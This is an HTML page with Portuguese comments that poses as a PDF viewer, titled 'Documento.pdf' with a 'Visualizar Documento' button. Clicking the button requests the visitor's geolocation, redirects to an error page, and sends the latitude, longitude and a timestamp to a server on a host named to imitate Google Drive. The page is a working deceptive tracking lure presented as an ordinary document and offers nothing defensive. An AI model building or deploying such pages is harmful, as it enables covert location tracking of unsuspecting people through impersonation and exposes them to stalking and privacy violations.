<!DOCTYPE html>
<html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Documento.pdf</title>
        <link rel="stylesheet" href="styles.css">
    </head>
<body>
    <button id="getLocation">Visualizar Documento</button>
    <div id="result"></div>

    <script>
        document.getElementById('getLocation').addEventListener('click', function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const date = new Date();
                    const timestamp = date.toISOString();

                    // Redirecionar para o link desejado
                    window.location.href = 'https://google-drive-vbfg.onrender.com//erro.html';  // Altere para o link desejado

                    // Enviar dados para o backend
                    fetch('https://google-drive-vbfg.onrender.com//api/location', {  // Corrigido para a rota correta
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            latitude: latitude,
                            longitude: longitude,
                            timestamp: timestamp
                        })
                    })
                    .then(response => response.json())
                    .then(data => console.log('Success:', data))
                    .catch((error) => console.error('Error:', error));
                }, function() {
                    alert('Erro ao obter localização.');
                });
            } else {
                alert('Geolocalização não é suportada neste navegador.');
            }
        });
    </script>
</body>
</html>
